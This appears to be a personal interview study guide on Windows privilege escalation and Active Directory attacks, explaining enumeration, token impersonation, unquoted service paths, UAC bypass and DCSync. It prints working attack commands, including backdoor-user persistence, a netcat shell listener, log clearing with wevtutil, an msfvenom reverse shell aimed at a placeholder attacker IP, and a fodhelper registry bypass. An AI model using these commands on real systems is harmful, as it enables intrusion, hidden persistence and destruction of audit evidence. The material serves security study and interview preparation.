---
description: 'Nice resource: https://www.thehacker.recipes/'
---

# FINAL INTERVIEW PREP

## Windows

### **Local Enumeration: Overview and Functionality**

**Local enumeration** refers to the process of gathering information about a system's configuration, settings, users, groups, installed software, and other resources from a local perspective. It is often used by administrators for auditing purposes or by attackers to discover vulnerabilities.

**How It Functions:**

1. **Information Gathering:** Tools and commands are used to extract details about the system's configuration, accounts, permissions, and installed software.
2. **Analysis:** The collected data is analyzed to identify misconfigurations, weaknesses, or potential vulnerabilities.

**How to Perform Local Enumeration on a Windows System:**

Here are some examples of commands and techniques used for local enumeration:

1. **Enumerate Users and Groups:**
   * `net user` (Lists all local users)
   * `net localgroup` (Lists all local groups and their members)
2. **Check Privileges and Security Policies:**
   * `whoami /priv` (Shows privileges of the current user)
   * `secedit /export /cfg C:\securityconfig.txt` (Exports security policies)
3. **Identify Running Services:**
   * `sc query` (Lists all running and stopped services)
   * `tasklist` (Lists all active processes)
4. **Check Installed Software:**
   * `wmic product get name,version` (Displays installed programs and versions)
5. **Network Information:**
   * `ipconfig /all` (Displays network configuration)
   * `netstat -ano` (Lists active network connections with associated processes)
6. **Filesystem Information:**
   * `dir /s` (Displays directory structure and contents)
   * `icacls` (Checks file and folder permissions)

### **How Attackers Use Local Enumeration for Privilege Escalation**

Once attackers gain local access to a Windows system, they use local enumeration to identify weaknesses they can exploit to elevate privileges or compromise the system further.

**Potential Attack Scenarios:**

1. **Discovering Weak Passwords:**
   * Attackers may check for accounts with weak or blank passwords using `net user`.
2. **Identifying Privileged Accounts:**
   * Using `net localgroup administrators` to list accounts with administrative privileges, attackers can target these accounts for privilege escalation.
3. **Finding Misconfigurations:**
   * Attackers can exploit misconfigured services, such as services running with SYSTEM privileges but accessible to low-privileged users (`sc qc [service-name]`).
4. **Abusing Privileges:**
   * If attackers identify sensitive privileges like `SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege` using `whoami /priv`, they may exploit techniques like **Token Impersonation** or **Named Pipe Impersonation** to escalate privileges.
5. **Leveraging Vulnerable Software:**
   * Enumeration of installed software using `wmic product get name,version` can help attackers identify outdated or vulnerable applications to exploit.
6. **File Permission Vulnerabilities:**
   * Attackers can identify files or folders with weak permissions using `icacls`. For example, writable directories in `C:\Program Files` might allow attackers to replace executables used by privileged users.
7. **Accessing Stored Credentials:**
   * Tools like `mimikatz` can extract stored credentials from memory, allowing attackers to impersonate other users or administrators.

### User Account Enumeration

#### **a. Identifying Accounts with Administrative or Elevated Privileges**

Once user accounts are enumerated, you can identify which accounts have administrative or elevated privileges by examining specific attributes, groups, and permissions associated with those accounts.

**Attributes and Groups to Look For:**

1. **Membership in Administrative Groups:**
   * Look for accounts in the **Administrators** group:
     * `net localgroup administrators` (Displays members of the local Administrators group)
   * Check for accounts in other privileged groups, such as:
     * **Power Users**
     * **Remote Desktop Users** (if they can access the system remotely)
     * **Backup Operators** (can bypass file permissions)
2. **Special Privileges:**
   * Use the `whoami /priv` command to check privileges. Look for sensitive privileges like:
     * `SeDebugPrivilege` (Debug Programs)
     * `SeTakeOwnershipPrivilege` (Take Ownership)
     * `SeImpersonatePrivilege` (Impersonate a Client)
3. **Group Policies or Domain Groups:**
   * On domain-joined systems, accounts in groups like **Domain Admins** or **Enterprise Admins** have elevated privileges across the domain.
4. **Login Rights and Access:**
   * Check user rights and access permissions using `gpresult /r` to see group membership and policies applied to specific accounts.

***

#### **b. Tools and Commands for User Account Enumeration**

**Built-in Windows Commands:**

1. **List Local Users:**
   * `net user` (Lists all local user accounts)
   * `wmic useraccount list full` (Provides detailed information about user accounts)
2. **List Group Memberships:**
   * `net localgroup` (Lists all groups)
   * `net localgroup [groupname]` (Lists members of a specific group, such as `Administrators`)
3. **Check Current User Privileges:**
   * `whoami /all` (Displays the current user’s group memberships and privileges)
4. **Domain Enumeration (if part of a domain):**
   * `net group /domain` (Lists domain groups)
   * `net group [groupname] /domain` (Lists members of a specific domain group)

**Third-Party Tools:**

1. **PowerShell Scripts:**
   * `Get-LocalUser` (PowerShell command to list local users)
   * `Get-LocalGroupMember -Group "Administrators"` (Lists members of the local Administrators group)
2. **Penetration Testing Tools:**
   * **PowerView** (Part of PowerSploit, used for advanced enumeration)
   * **BloodHound** (Visualizes user privileges and attack paths in Active Directory environments)
3. **PsExec and PsTools Suite (Sysinternals):**
   * Tools like `PsExec` can be used for remote enumeration of accounts and permissions.

***

#### **c. Making Persistence on a System with Administrative Privileges**

If you have admin privileges and can create a new user, you could establish persistence by creating a backdoor user or configuring settings to ensure your access remains undetected.

**Steps for Persistence:**

1. **Create a New User:**
   *   Use the following commands to create a user and add them to the Administrators group:

       ```cmd
       net user backdoor password123 /add
       net localgroup administrators backdoor /add
       ```
2. **Enable RDP Access for Persistence:**
   *   Allow the new user to log in remotely:

       ```cmd
       net localgroup "Remote Desktop Users" backdoor /add
       ```
   *   Open the RDP port if it’s closed:

       ```cmd
       netsh advfirewall firewall add rule name="RDP" protocol=TCP dir=in localport=3389 action=allow
       ```
3. **Create a Scheduled Task:**
   *   Configure a task to re-establish access or execute malicious scripts periodically:

       ```cmd
       schtasks /create /sc daily /tn "BackdoorTask" /tr "C:\backdoor.exe" /ru backdoor /rp password123
       ```
4. **Set Up a Service:**
   *   Install a malicious service that automatically starts with elevated privileges:

       ```cmd
       sc create backdoor binpath= "C:\malicious.exe" start= auto
       ```
5. **Manipulate Registry for Persistence:**
   *   Add an entry in the registry for persistence:

       ```cmd
       reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d "C:\backdoor.exe"
       ```
6. **Use Existing Tools:**
   *   Install tools like **netcat** or set up a reverse shell to regain access later:

       ```cmd
       nc -lvp 4444 -e cmd.exe
       ```

**Covering Tracks:**

1. **Clear Logs:**
   *   Use the `wevtutil` command to clear logs:

       ```cmd
       wevtutil cl System
       wevtutil cl Security
       ```
2. **Rename or Hide the User:**
   *   Rename the backdoor account to look legitimate:

       ```cmd
       net user backdoor admin1
       ```
   *   Disable the account but keep it in the Administrators group:

       ```cmd
       net user backdoor /active:no
       ```

By employing these methods, attackers can ensure long-term access while minimizing the likelihood of detection. However, implementing strong security measures and monitoring can help mitigate these risks.

### Service Enumeration

#### **a. Enumerating Services on a Compromised Windows System**

To enumerate services on a compromised Windows system, you can use a variety of built-in commands, PowerShell cmdlets, or third-party tools to gather detailed information about running and stopped services, including their configuration, permissions, and associated accounts.

**Commands and Tools for Enumerating Services:**

1. **Using Built-in Commands:**
   *   **List All Services:**

       ```cmd
       sc query
       ```

       (Displays the status of all services: running, stopped, or paused)
   *   **Detailed Service Information:**

       ```cmd
       sc qc [service-name]
       ```

       (Shows service configuration, including binary path, startup type, and the account it's running under)
   *   **List Only Running Services:**

       ```cmd
       tasklist /svc
       ```

       (Shows running processes and the services associated with them)
   *   **Export Service Configurations:**

       ```cmd
       sc query > services.txt
       ```
2. **Using PowerShell:**
   *   **List All Services:**

       ```powershell
       Get-Service
       ```

       (Shows a simple list of services and their statuses)
   *   **Detailed Information:**

       ```powershell
       Get-WmiObject -Class Win32_Service | Select-Object Name, StartMode, State, PathName, StartName
       ```
3. **Third-Party Tools:**
   * **PowerUp (PowerSploit module):** Used for automated enumeration of services and identification of misconfigurations.
   * **WinPEAS:** A comprehensive enumeration tool that scans for privilege escalation vectors, including service misconfigurations.

***

#### **b. Identifying and Exploiting Misconfigured Services**

Misconfigured services can often be exploited for privilege escalation, especially when they run with SYSTEM or administrative privileges but are improperly secured.

**Steps to Identify Misconfigurations:**

1. **Check Service Permissions:**
   * Use the `sc sdshow [service-name]` command to view the security descriptor of a service. Look for weak permissions like "Everyone" or "Authenticated Users" having `WRITE` or `CHANGE_CONFIG` access.
2. **Analyze Service Binary Path:**
   *   Check the `PathName` of the service using:

       ```cmd
       sc qc [service-name]
       ```

       Look for:

       * Unquoted service paths (e.g., `C:\Program Files\My Service\service.exe` instead of `"C:\Program Files\My Service\service.exe"`)
       * Writable directories in the service path.
3. **Verify User Context:**
   * Check the account under which the service is running using the `StartName` field from `sc qc` or `Get-WmiObject`.
4. **Startup Type:**
   * Identify services with `Auto` or `Delayed` startup that can be triggered upon reboot.
5. **Writable Service Binaries:**
   *   Check if the service binary file is writable using:

       ```cmd
       icacls "C:\path\to\service.exe"
       ```

**Exploitable Misconfigurations:**

1. **Unquoted Service Path Vulnerability:**
   * If a service binary path is unquoted and contains spaces, an attacker can place a malicious executable in a higher-precedence directory. For example:
     * `C:\Program Files\My Service\service.exe` → Place a malicious `My.exe` in `C:\Program Files\`.
2. **Weak Service Permissions:**
   *   If an attacker can modify the service configuration (e.g., `ChangeConfig` permissions), they can change the service's binary to their payload:

       ```cmd
       sc config [service-name] binpath= "C:\path\to\payload.exe"
       sc start [service-name]
       ```
3. **Writable Service Binaries:**
   * If the binary file is writable, replace it with a malicious executable. The next time the service starts, the attacker's code runs with the service's privileges.
4. **Startup Scripts:**
   * Exploit startup scripts or executables associated with a service.

***

#### **c. Identifying Services Running with SYSTEM or Administrative Privileges**

To determine which services are running with elevated privileges, examine their `StartName` attribute, which specifies the user account under which the service runs.

**Steps to Identify Privileged Services:**

1. **Check Service Account:**
   * Use the `sc qc [service-name]` or `Get-WmiObject` commands to inspect the `StartName` field:
     * `LocalSystem` or `NT AUTHORITY\SYSTEM`: The service has SYSTEM privileges.
     * `LocalService` or `NetworkService`: Limited built-in accounts with fewer privileges.
     * Domain Administrator or other privileged accounts: Indicates potential for privilege escalation.
2. **Filter Services by Privileges:**
   *   PowerShell example:

       ```powershell
       Get-WmiObject -Class Win32_Service | Where-Object { $_.StartName -eq "LocalSystem" }
       ```
3. **Look for Sensitive Services:**
   * Pay special attention to services critical to the OS, like:
     * **Windows Management Instrumentation (WMI)**
     * **Windows Defender**
     * **Remote Desktop Services**
     * Any custom services running as SYSTEM.

**Indicators of Privileged Services:**

* **StartName:** `LocalSystem`, `NT AUTHORITY\SYSTEM`, or `Administrator`
* **Privileges:** Services that can interact with the desktop or load drivers are particularly dangerous.
* **Startup Type:** Automatically started services are more likely to be exploitable for persistence.

### Automated Enumeration

#### **a. Popular Tools and Frameworks for Automated Enumeration in Privilege Escalation Attacks**

1. **Windows-Specific Tools:**
   * **WinPEAS (Privilege Escalation Awesome Scripts):** A comprehensive script for Windows privilege escalation that automates the discovery of vulnerabilities like misconfigured services, weak permissions, or sensitive files.
   * **PowerUp (PowerSploit):** A PowerShell module designed to automate privilege escalation checks on Windows systems, such as vulnerable services or improperly configured permissions.
   * **Seatbelt:** A C# enumeration tool for assessing the security posture of Windows systems, identifying misconfigurations, credentials, and more.
2. **Cross-Platform Tools:**
   * **Metasploit Framework:** Offers modules like `post/windows/gather/enum_services` for automated enumeration of services, credentials, and vulnerabilities.
   * **BloodHound:** Primarily for Active Directory environments, it maps out attack paths by analyzing user and group relationships.
   * **SharpUp:** A C# tool that automates privilege escalation checks on Windows systems.
3. **Others:**
   * **Empire (PowerShell Empire):** A post-exploitation framework that includes automated enumeration modules.
   * **PowerShell Scripts:** Tools like Nishang and PrivescCheck automate privilege escalation enumeration.
   * **Custom Python Scripts:** Attackers often use custom Python scripts tailored to specific environments.

### DLL Hijacking

{% embed url="https://medium.com/@zapbroob9/dll-hijacking-basics-ea60b0f2a1d8" %}

### DLL Hijacking vs DLL Injection

#### **Key Differences**

| Feature     | DLL Hijacking                         | DLL Injection                             |
| ----------- | ------------------------------------- | ----------------------------------------- |
| **Focus**   | Exploits the DLL search order.        | Injects a DLL into a running process.     |
| **Trigger** | Happens during application startup.   | Requires runtime access to the process.   |
| **Target**  | Legitimate application loading a DLL. | Specific process in memory.               |
| **Method**  | Replacing or planting a fake DLL.     | Using Windows API or memory manipulation. |
| **Usage**   | Usually malicious.                    | Can be malicious or legitimate.           |

***

#### **Real-World Examples**

* **DLL Hijacking**:
  * Exploiting Microsoft Office or other programs vulnerable to improper DLL search order.
  * Placing a malicious DLL in a writable directory (e.g., `Downloads` or `Temp`).
* **DLL Injection**:
  * Tools like **Mimikatz** use DLL injection to extract credentials.
  * Malware injecting keylogging functionality into browsers.

### Abusing Tokens

#### **a. What is Token Impersonation, How It Functions, and Its Importance in Windows Systems**

**Token Impersonation:**

Token impersonation is a technique in which a process or thread "impersonates" another user’s security token to perform actions as that user. In Windows, security tokens are critical to identity and access management, as they store information about a user’s privileges and group memberships.

**How It Functions:**

1. **Security Tokens**:
   * When a user logs in, Windows creates a **security token** for the session. This token contains the user's identity, groups, and privileges.
2. **Impersonation**:
   * A thread can use a **primary token** (representing the owner of a process) or an **impersonation token** to temporarily act on behalf of another user.
3. **Functionality**:
   * Applications and services use token impersonation to temporarily act with a different user's privileges for specific tasks, such as accessing network resources.

**Importance in Windows:**

1. **Delegation**: Allows services to act on behalf of users (e.g., file access, resource sharing).
2. **Access Control**: Determines permissions for files, registry keys, and other objects.
3. **Privilege Management**: Ensures only authorized actions can be performed.

***

#### **b. How an Attacker Could Use Token Impersonation for Privilege Escalation**

**Attack Process:**

1. **Gaining Initial Access**:
   * The attacker must first gain access to a system, often as a low-privileged user.
2. **Identifying Tokens**:
   * Use tools to locate **impersonation tokens** belonging to higher-privileged accounts, such as **Administrator** or **SYSTEM**.
3. **Exploiting Tokens**:
   * If a privileged token is available, the attacker can impersonate it to execute commands or access resources with elevated privileges.

**Potential Tools:**

* **Windows API Functions**:
  * Tools or scripts may use Windows API calls like:
    * `OpenProcessToken`
    * `ImpersonateLoggedOnUser`
    * `DuplicateToken`
* **Specific Tools**:
  1. **Mimikatz**:
     * Extracts and manipulates tokens.
     * Command: `privilege::debug` → `token::elevate`
  2. **Incognito** (part of Metasploit):
     * Lists available tokens and impersonates them.
     * Commands: `list_tokens -u`, `impersonate_token`
  3. **Rubeus**:
     * Focused on Kerberos, but supports token manipulation.
  4. **PowerShell Scripts**:
     * Tools like **PowerSploit** include functions for token impersonation.
     * Example: `Invoke-TokenManipulation`

***

#### **c. Identifying Target Accounts or System Entities for Token Impersonation**

**Identifying Target Accounts:**

Attackers analyze the system to find high-value tokens, often belonging to privileged accounts. They may:

1. **Enumerate Logged-On Users**:
   * List all users currently logged in to the system.
   *   Tools: `quser`, `whoami`, or PowerShell commands like:

       ```powershell
       Get-WmiObject -Class Win32_ComputerSystem | Select-Object -ExpandProperty UserName
       ```
2. **Search for Running Processes**:
   * Look for processes running under privileged accounts (e.g., `winlogon.exe`, `services.exe`).
   * Tools: `tasklist`, Sysinternals' **Process Explorer**.
3. **List Available Tokens**:
   * Use tools like **Incognito** or **Mimikatz** to enumerate accessible tokens.

**Factors Influencing the Choice of Targets:**

1. **Privilege Level**:
   * Tokens belonging to **SYSTEM**, **Administrator**, or domain admin accounts are the most valuable.
2. **Availability**:
   * Tokens must be available for impersonation (e.g., tokens left by services or logged-in users).
3. **Privileges**:
   * Tokens with elevated privileges such as `SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege` are prime targets.
4. **Purpose**:
   * The attacker’s goal (e.g., data exfiltration, lateral movement) determines the choice of account.

***

#### **Example: Privilege Escalation with Token Impersonation**

1. **Scenario**:
   * A low-privileged attacker gains access to a server where a service account with Administrator privileges is running.
2. **Attack Steps**:
   *   Use **Mimikatz** to enumerate available tokens:

       ```plaintext
       privilege::debug
       token::list
       ```
   * Identify a token belonging to the Administrator account.
   *   Impersonate the token:

       ```plaintext
       token::elevate
       ```
   *   Execute privileged commands (e.g., creating a new Administrator user):

       ```plaintext
       net user hacked Pass123 /add
       net localgroup administrators hacked /add
       ```
3. **Combining Techniques**:
   * Pair token impersonation with **Kerberos ticket attacks** (e.g., Pass-the-Ticket) for lateral movement.
   * Use **persistence techniques** (e.g., modifying startup programs) to maintain access after privilege escalation.

***

By abusing token impersonation, attackers can not only escalate privileges but also masquerade as legitimate users, making detection and forensic analysis significantly harder.

### Unquoted Paths

#### **a. What Are Unquoted Paths and Why Are They a Security Risk?**

**What Are Unquoted Paths?**

In Windows, services and executables are often configured with file paths to specify where their binaries reside. If a path contains spaces and is not enclosed in double quotes, it is considered an **unquoted path**. For example:

* `"C:\Program Files\My Service\service.exe"` (properly quoted)
* `C:\Program Files\My Service\service.exe` (unquoted path).

**Why Is This a Security Risk?**

When a path is unquoted, Windows may incorrectly interpret the path due to spaces and attempt to execute files in unintended locations. For example:

* If the service path is `C:\Program Files\My Service\service.exe`, Windows might look for:
  1. `C:\Program.exe`
  2. `C:\Program Files\My.exe`
  3. `C:\Program Files\My Service\service.exe`

If an attacker places a malicious executable named `Program.exe` or `My.exe` in a location searched first, it will be executed instead of the intended service binary.

**Security Risk for Privilege Escalation:**

1. **Service Privileges**: Many services run with elevated privileges (e.g., SYSTEM or Administrator).
2. **Malicious Binary Execution**: An attacker can exploit unquoted paths to execute their malicious binary with the same privileges as the service.
3. **Persistence**: Exploiting unquoted paths may allow attackers to maintain elevated access.

***

#### **b. How to Identify Unquoted Paths on a Windows System**

**Manual Inspection:**

1.  **Check Service Configurations**:\
    Use the `sc qc` command to display service details:

    ```plaintext
    sc qc "ServiceName"
    ```

    Look for unquoted paths in the `BINARY_PATH_NAME`.
2.  **Check Registry Entries**:\
    Service configurations are stored in the registry under:

    ```plaintext
    HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services
    ```

    Inspect the `ImagePath` value for each service.

**Automated Tools and Techniques:**

1.  **PowerShell Script**:\
    Use PowerShell to enumerate services with unquoted paths:

    ```powershell
    Get-WmiObject Win32_Service | Where-Object { $_.PathName -match ' ' -and $_.PathName -notmatch '"' } | Select-Object Name, PathName
    ```
2.  **WMIC Command**:\
    List all services and search for unquoted paths:

    ```plaintext
    wmic service get name,displayname,pathname,startmode | findstr /i "C:\Program"
    ```
3. **Third-Party Tools**:
   * **WinPEAS**: Automates the process of finding misconfigurations, including unquoted paths.
   * **AccessChk**: From Sysinternals, can check permissions on directories and services.

***

#### **c. Exploiting Unquoted Paths for Privilege Escalation**

**Exploitation Process:**

1.  **Identify the Vulnerable Service**:\
    Use tools or techniques mentioned in part (b) to locate a service with an unquoted path, e.g.:

    ```plaintext
    Path: C:\Program Files\My Service\service.exe
    ```
2.  **Determine Service Privileges**:\
    Check if the service runs as `SYSTEM` or an Administrator account using:

    ```plaintext
    sc qc "ServiceName"
    ```

    Look for the `SERVICE_START_NAME` field.
3. **Create a Malicious Binary**:\
   Create a malicious executable (e.g., reverse shell, backdoor) using tools like:
   *   **msfvenom**:

       ```plaintext
       msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=<attacker_port> -f exe -o Program.exe
       ```
   * **PowerShell Empire**, **Metasploit**, or **manual coding**.
4. **Place the Malicious Binary**:\
   Place the binary in one of the paths Windows will search first, e.g.:
   * `C:\Program.exe`
   * `C:\Program Files\My.exe`
5.  **Trigger the Service**:\
    Restart the service to execute the malicious binary:

    ```plaintext
    net stop "ServiceName" && net start "ServiceName"
    ```
6. **Gain Elevated Privileges**:\
   When the service starts, it executes the malicious binary with the same privileges as the service, granting the attacker SYSTEM or Administrator access.

***

#### **Example Scenario**

**Vulnerable Configuration:**

A service named `VulnerableService` has the following unquoted path:

```plaintext
C:\Program Files\Vulnerable Service\service.exe
```

The service runs as `SYSTEM`.

**Steps to Exploit:**

1.  **Identify the Vulnerable Service**:

    ```plaintext
    sc qc "VulnerableService"
    ```

    Output:

    ```plaintext
    BINARY_PATH_NAME : C:\Program Files\Vulnerable Service\service.exe
    ```
2. **Prepare the Malicious Binary**:\
   Create `Program.exe` with a reverse shell payload.
3. **Place the Binary**:\
   Copy `Program.exe` to `C:\`.
4.  **Trigger the Exploit**:\
    Restart the service:

    ```plaintext
    net stop "VulnerableService" && net start "VulnerableService"
    ```
5. **Impact**:\
   When the service starts, Windows executes `C:\Program.exe` with SYSTEM privileges, allowing the attacker full control of the system.

***

#### **Mitigation**

1. **Always Quote Paths**:\
   Ensure all paths in service configurations are enclosed in double quotes.\
   Example: `"C:\Program Files\My Service\service.exe"`
2. **Restrict Directory Permissions**:\
   Ensure unprivileged users cannot write to directories like `C:\`.
3. **Monitoring and Alerts**:\
   Use security monitoring tools to detect unquoted paths and unauthorized changes to service configurations.

### User Account Control Bypass (UAC Bypass)

#### **a. What is User Account Control (UAC), How Does It Function, and Its Importance?**

**What is UAC?**

User Account Control (UAC) is a Windows security feature designed to prevent unauthorized changes to a system. It prompts users for permission or administrative credentials when an action requires elevated privileges. This reduces the likelihood of malware or untrusted applications executing with administrative rights without user consent.

**How Does UAC Work?**

1. **Privilege Separation**: When logged in as an administrator, users run applications with standard privileges by default. UAC ensures that elevated privileges are granted only when explicitly authorized.
2. **Secure Desktop**: UAC prompts are displayed on a secure desktop to prevent malicious applications from spoofing the UAC dialog.
3. **UAC Prompt Levels**: The UAC settings allow customization of prompt behavior, such as always notifying or never notifying.

**Importance of UAC:**

* **Prevents Unauthorized Changes**: Stops malicious software from altering system settings without user consent.
* **Protects System Integrity**: Ensures only trusted actions can modify protected resources.
* **Encourages Least Privilege**: Encourages users to operate with standard privileges, limiting the attack surface.

***

#### **b. Tools and Techniques to Bypass UAC on Windows Systems**

Despite its security benefits, UAC can be bypassed through various techniques that exploit misconfigurations, registry settings, or vulnerabilities in Windows components.

**Common Techniques to Bypass UAC:**

1. **Fileless Attacks**: Use legitimate Windows utilities (e.g., `msiexec.exe`, `fodhelper.exe`) to bypass UAC. These tools are already trusted by the system and do not trigger a UAC prompt.
   *   Example:

       ```plaintext
       fodhelper.exe bypasses UAC by exploiting registry key modifications under HKCU\Software\Classes\ms-settings.
       ```
2. **DLL Hijacking**: Load a malicious DLL into a trusted application running with elevated privileges.
3. **Registry Hijacking**: Modify registry keys used by applications or processes with auto-elevation features to point to malicious executables.
4. **COM Interface Abuse**: Abuse COM objects with auto-elevate properties to execute code with administrative privileges.

**Popular Tools and Frameworks:**

1. **Metasploit Framework**:
   * Includes modules for UAC bypass.\
     Example: `exploit/windows/local/bypassuac`
2. **PowerSploit**:
   * A PowerShell-based toolkit with scripts for UAC bypass (e.g., `Invoke-BypassUAC`).
3. **UACME**:
   * A tool that exploits Windows auto-elevation vulnerabilities for UAC bypass.
4. **Empire Framework**:
   * Includes built-in UAC bypass modules, such as `Invoke-BypassUAC`.
5. **Custom Scripts**:
   * Scripts leveraging known techniques like the fodhelper.exe or eventvwr.exe methods.

***

#### **c. Potential Impact of Successfully Bypassing UAC on a Compromised System**

Bypassing UAC allows an attacker to elevate privileges on a compromised system, enabling actions that were previously restricted.

**Impact on System Security:**

1. **Privilege Escalation**:
   * Gain administrative rights, enabling unrestricted access to system resources.
   * Execute commands and applications that require elevated privileges.
2. **Persistence**:
   * Install rootkits, backdoors, or malicious services to maintain long-term control over the system.

**Impact on System Integrity:**

1. **System Configuration Changes**:
   * Modify security policies, disable antivirus solutions, or alter firewall rules.
   * Tamper with sensitive files or settings that require administrative permissions.
2. **Infect Other Processes**:
   * Inject malicious code into high-privilege processes, spreading the attack.

**Impact on Confidentiality:**

1. **Access Sensitive Data**:
   * Read or modify files accessible only to administrators.
   * Access credentials or hashes stored in privileged locations.
2. **Steal Information**:
   * Exfiltrate data from protected directories, such as system logs or security databases.

***

#### **Example Scenario: UAC Bypass for Privilege Escalation**

1. **Initial Access**: An attacker gains access to a Windows system with standard user privileges.
2. **Identify Elevation Opportunity**: The attacker finds that the UAC prompt is set to "default," allowing certain system tools to auto-elevate.
3. **Execute Bypass**: The attacker uses the `fodhelper.exe` method to bypass UAC:
   *   Modify the registry key:

       ```powershell
       New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "(Default)" -Value "C:\Malicious.exe"
       ```
   * Trigger the bypass by executing `fodhelper.exe`.
4. **Achieve Privilege Escalation**: The malicious executable runs with administrative privileges, granting the attacker full control over the system.

By successfully bypassing UAC, the attacker can fully compromise the target system, evade detection, and escalate their attack chain.

## AD

### NBT-NS vs DNS

* **NBT-NS** is primarily used for legacy support and local name resolution (via NetBIOS), whereas **DNS** is the modern and essential service used for global and domain name resolution in Active Directory.
* **NBT-NS** works with NetBIOS names and is limited to local networks, while **DNS** works with FQDNs and is essential for locating AD resources, including domain controllers.
* **NBT-NS** is still used when **DNS** cannot resolve the name or for compatibility with older systems and applications.
* In **Active Directory**, DNS is critical for the **domain controller location**, **Kerberos authentication**, and **replication**. NBT-NS is only used for backward compatibility and name resolution in older Windows environments.

In short, DNS is essential in Active Directory environments, whereas NBT-NS is more of a legacy protocol with limited use in modern AD deployments.

## LLMNR vs NBT-NS vs DNS

| Feature | **LLMNR** | **NBT-NS** | **DNS** |
| ------- | --------- | ---------- | ------- |

| **Purpose** | Resolves names on local network when DNS is unavailable | Resolves NetBIOS names to IP addresses | Resolves FQDNs to IP addresses, essential for AD |
| ----------- | ------------------------------------------------------- | -------------------------------------- | ------------------------------------------------ |

| **Scope** | Local network (link-local) | Local network (usually within the subnet) | Global (across internet and AD environments) |
| --------- | -------------------------- | ----------------------------------------- | -------------------------------------------- |

| **Protocol** | UDP port 5355 | UDP port 137 | UDP/TCP port 53 |
| ------------ | ------------- | ------------ | --------------- |

| **Type of Names Resolved** | Hostnames (e.g., `hostname.local`) | NetBIOS names (e.g., `WORKSTATION1`) | FQDNs (e.g., `server.example.com`) |
| -------------------------- | ---------------------------------- | ------------------------------------ | ---------------------------------- |

| **Uses in Active Directory** | Less commonly used, can be a fallback | Rarely used in modern AD environments | Critical for AD services (domain controllers, authentication) |
| ---------------------------- | ------------------------------------- | ------------------------------------- | ------------------------------------------------------------- |

| **Fallback Mechanism** | Yes, when DNS is not available | Yes, for legacy NetBIOS resolution | Primary and required in modern AD networks |
| ---------------------- | ------------------------------ | ---------------------------------- | ------------------------------------------ |

| **Security Considerations** | Vulnerable to MITM attacks, should be disabled if not needed | Vulnerable to name resolution poisoning and spoofing | Secure if configured correctly, supports DNSSEC |
| --------------------------- | ------------------------------------------------------------ | ---------------------------------------------------- | ----------------------------------------------- |

| **Modern Usage** | Used in smaller or simpler networks, can be disabled | Used in legacy systems or when DNS is not configured | Essential in all modern network infrastructures, especially AD |
| ---------------- | ---------------------------------------------------- | ---------------------------------------------------- | -------------------------------------------------------------- |



### Important ports in AD environment

* `53/TCP` and `53/UDP` for DNS
* `88/TCP` for Kerberos authentication
* `135/TCP` and `135/UDP` MS-RPC epmapper (EndPoint Mapper)
* `137/TCP` and `137/UDP` for NBT-NS
* `138/UDP` for NetBIOS datagram service
* `139/TCP` for NetBIOS session service
* `389/TCP` for LDAP
* `636/TCP` for LDAPS (LDAP over TLS/SSL)
* `445/TCP` and `445/UDP` for SMB
* `464/TCP` and `445/UDP` for Kerberos password change
* `3268/TCP` for LDAP Global Catalog
* `3269/TCP` for LDAP Global Catalog over TLS/SSL

### RID vs SID

| Feature               | **SID**                                                       | **RID**                                         |
| --------------------- | ------------------------------------------------------------- | ----------------------------------------------- |
| **Purpose**           | Globally unique identifier for security principals            | Unique identifier for objects within a domain   |
| **Structure**         | Domain identifier + RID                                       | The last part of the SID (individual object ID) |
| **Scope**             | Unique across the entire domain or forest                     | Unique within a single domain                   |
| **Use Case**          | Used in permissions, ACLs, authentication, and access control | Used to uniquely identify objects in a domain   |
| **Global Uniqueness** | Yes, it is globally unique in a forest                        | No, it is only unique within the domain         |

#### Summary:

* **SID** is a **global identifier** for an object in the Active Directory environment, used for security and access control across the entire domain or forest.
* **RID** is a **local identifier** within a domain, part of the SID, and uniquely identifies an object (like a user or group) within that domain. It is used to distinguish between objects in the same domain.

### DCSync

#### **What is DCSync?**

DCSync is a **post-exploitation technique** used in Active Directory (AD) environments to impersonate a Domain Controller (DC) and request sensitive data, including user password hashes. Essentially, it leverages the **Directory Replication Service (DRS)** protocol to pull data from the AD database.

Attackers use this technique to extract **password hashes**, **Kerberos keys**, and other critical secrets from the Domain Controller without needing direct access to it.

***

#### **How Does DCSync Work?**

1. **Active Directory Replication Basics:**
   * In AD, Domain Controllers replicate changes to each other using the **Directory Replication Service (DRS)**.
   * This service uses the **DSGetNCChanges()** function to synchronize data between DCs. It allows one DC to request information (e.g., password hashes) from another DC.
   * Only privileged accounts (e.g., Domain Admins, Enterprise Admins) or accounts with **replication permissions** can request this data.
2. **Abusing Replication Permissions:**
   * Attackers with **Domain Admin privileges** (or any account with replication rights) can abuse the DRS protocol to:
     * Pull **NTLM password hashes**.
     * Extract **Kerberos keys** (krbtgt account hash used to forge Golden Tickets).
     * Gather other sensitive user attributes.
   * This is done by simulating the behavior of a legitimate Domain Controller using tools like **Mimikatz**.
3. **Tools Used for DCSync:**
   * **Mimikatz**: Popular tool for executing DCSync. The `lsadump::dcsync` command allows attackers to fetch NTLM password hashes and Kerberos keys.
   * **Impacket**: Tools like `secretsdump.py` in Impacket can also perform DCSync attacks.

***

#### **Steps in a DCSync Attack:**

1. **Obtain Privileged Access:**
   * The attacker compromises an account with replication privileges (e.g., Domain Admin or an account explicitly delegated replication permissions).
   * Alternatively, escalate privileges to obtain such access.
2. **Execute the Attack:**
   * Use tools like Mimikatz or Impacket to simulate a Domain Controller and send replication requests.
   * The attacker requests specific data, such as:
     * NTLM password hashes for users.
     * The Kerberos **krbtgt** account hash.
     * Other sensitive AD attributes.
3.  **Utilize the Extracted Data:**

    * Use password hashes for **Pass-the-Hash (PtH)** attacks.
    * Forge **Golden Tickets** using the `krbtgt` hash for long-term AD persistence.
    * Move laterally and escalate privileges further in the network.



### Potatoes

Learn more: [https://jlajara.gitlab.io/Potatoes\_Windows\_Privesc](https://jlajara.gitlab.io/Potatoes_Windows_Privesc)

